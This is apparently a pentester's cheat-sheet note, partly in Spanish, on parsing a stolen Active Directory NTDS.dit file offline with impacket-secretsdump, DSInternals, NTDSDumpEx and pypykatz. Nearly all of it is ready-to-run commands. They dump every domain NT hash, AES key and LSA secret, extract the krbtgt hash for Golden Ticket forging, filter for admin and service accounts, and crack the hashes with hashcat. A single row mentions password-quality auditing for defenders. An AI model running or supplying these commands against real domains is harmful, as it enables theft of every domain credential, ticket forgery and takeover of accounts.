---
aliases:
  - NTDS Offline Parse
  - secretsdump LOCAL
  - DSInternals
tags:
  - technique/credential-access
  - env/windows
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[NTDS.dit Extraction]]"
---
# NTDS.dit Extraction - Offline Parsing

---

## impacket-secretsdump LOCAL

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL` | Full dump — NT hashes, AES keys, history | Standard parse. |
| `impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -just-dc-ntlm` | Solo NT hashes | PtH / hashcat directo. |
| `impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -outputfile hashes` | Files: `hashes.ntds`, `hashes.ntds.kerberos` | Pipeline. |
| `impacket-secretsdump -system SYSTEM -sam SAM LOCAL` | Local SAM hashes | DC local users. |
| `impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY LOCAL` | SAM + LSA Secrets | Service accounts + SAM. |
| `impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL 2>/dev/null \| grep ":::"` | Solo líneas de hash | Quick extract. |
^ntds-offline-secretsdump

```bash
# Full dump con output a archivo
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -outputfile domain_hashes

# Solo NT hashes (formato user:RID:LM:NT:::)
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -just-dc-ntlm 2>/dev/null \
  | grep ":::" | tee nt_hashes.txt

# Extract solo NT hash column
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -just-dc-ntlm 2>/dev/null \
  | grep ":::" | cut -d: -f4 | sort -u > nt_only.txt
```

---

## DSInternals (PowerShell)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-BootKey -SystemHivePath '.\SYSTEM'` | BootKey para decrypt | Step 1 — siempre. |
| `Get-ADDBAccount -All -DatabasePath '.\ntds.dit' -BootKey $key` | Todos los objetos con hashes | Full dump. |
| `Get-ADDBAccount -All ... \| Format-Custom -View HashcatNT` | Formato hashcat `$NT$hash` | Pre-crack. |
| `Get-ADDBAccount -SamAccountName krbtgt ... \| Format-Custom -View HashcatNT` | krbtgt hash | Golden Ticket prep. |
| `Get-ADDBAccount -All ... \| Select SamAccountName,NTHash,AES256Key` | Selective output | Custom pipeline. |
| `Test-PasswordQuality -DatabasePath '.\ntds.dit' -BootKey $key -WeakPasswordHashesSortedFile hibp.txt` | Password quality audit | Blue team / pentest report. |
^ntds-offline-dsinternals

```powershell
# Instalar DSInternals
Install-Module DSInternals -Force

# Parse offline
$key = Get-BootKey -SystemHivePath '.\SYSTEM'

# Todos los hashes — formato hashcat
Get-ADDBAccount -All -DatabasePath '.\ntds.dit' -BootKey $key |
  Format-Custom -View HashcatNT | Out-File hashcat_hashes.txt

# Solo krbtgt
Get-ADDBAccount -SamAccountName krbtgt -DatabasePath '.\ntds.dit' -BootKey $key

# Con info extra (UAC, LastLogon, etc.)
Get-ADDBAccount -All -DatabasePath '.\ntds.dit' -BootKey $key |
  Select-Object SamAccountName, DistinguishedName, NTHash, PasswordLastSet, Enabled
```

---

## NTDSDumpEx

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `NTDSDumpEx.exe -d ntds.dit -s SYSTEM` | NT hashes (Windows native) | Windows-only alternative. |
| `NTDSDumpEx.exe -d ntds.dit -s SYSTEM -o hashes.txt` | Output a file | Pipeline. |
| `NTDSDumpEx.exe -d ntds.dit -s SYSTEM -h` | Solo NT hash column | Minimal output. |
^ntds-offline-ntdsdumpex

```cmd
:: Windows — parse local
NTDSDumpEx.exe -d ntds.dit -s SYSTEM -o hashes.txt
```

---

## pypykatz registry (SAM/SECURITY)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `pypykatz registry --system SYSTEM SAM` | Local SAM hashes | DC local users. |
| `pypykatz registry --system SYSTEM SECURITY` | LSA Secrets — service account creds | Domain-joined services. |
| `pypykatz registry --system SYSTEM --sam SAM --security SECURITY` | Combo SAM + SECURITY | Full local parse. |
^ntds-offline-pypykatz

```bash
# SAM + SECURITY local parse
pypykatz registry --system SYSTEM --sam SAM --security SECURITY

# Install
pip install pypykatz
```

---

## Output Filtering

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `grep ":::" hashes.ntds` | Solo líneas de hash (excluir info lines) | Limpieza output. |
| `cut -d: -f1,4 hashes.ntds \| grep ":::"` | user:NThash | Formato compacto. |
| `cut -d: -f4 hashes.ntds \| sort -u` | NT hashes únicos | Pre-hashcat. |
| `grep -i "admin\|da\|krbtgt\|svc\|service" hashes.ntds` | High-value accounts | Priorización. |
| `grep ":500:" hashes.ntds` | RID 500 = built-in administrator | Directo al objetivo. |
| `awk -F: 'NF>3{print $1":"$4}' hashes.ntds` | user:NT limpio | Pipeline. |
^ntds-offline-filter

```bash
# Extract solo NT hashes únicos para hashcat
grep ":::" hashes.ntds | cut -d: -f4 | sort -u > for_hashcat.txt

# Encontrar DA/admin accounts
grep -i "admin\|krbtgt\|svc_" hashes.ntds | cut -d: -f1,4

# Built-in administrator (RID 500)
grep ":500:" hashes.ntds
```

---

## Hash Formats en Output

| **Formato** | **Ejemplo** | **Uso** |
|:---:|:---:|:---:|
| secretsdump estándar | `administrator:500:aad3b435:5f4dcc3b:::` | `user:RID:LM:NT:::` |
| NT hash solo | `5f4dcc3b5aa765d61d8327deb882cf99` | hashcat `-m 1000` |
| hashcat NT | `$NT$5f4dcc3b5aa765d61d8327deb882cf99` | hashcat con `$NT$` prefix |
| DSInternals HashcatNT | `$NT$hash` | hashcat `-m 1000` |
| Kerberos AES256 | `krbtgt:aes256cts-hmac-sha1-96:HEXHEX` | Silver/Golden forging |
| NTLMv2 (no NTDS) | `user::domain:challenge:response` | Responder output — crackear offline |
^ntds-offline-hashfmt

```bash
# hashcat NT hash (modo 1000)
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt

# hashcat con reglas
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---
